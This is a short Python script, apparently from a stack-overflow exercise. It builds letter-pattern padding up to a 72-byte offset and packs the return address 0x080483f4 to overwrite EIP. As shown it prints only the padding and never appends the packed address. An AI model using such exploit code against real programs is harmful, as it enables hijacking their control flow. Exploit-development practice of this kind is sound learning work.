import string
import struct

payload = ""

for i, c in enumerate(string.ascii_uppercase):
    if (int(i) + 1) * 4 == 72:
        break
    payload += c * 4 

eip = struct.pack("I",0x080483f4)
print(payload)
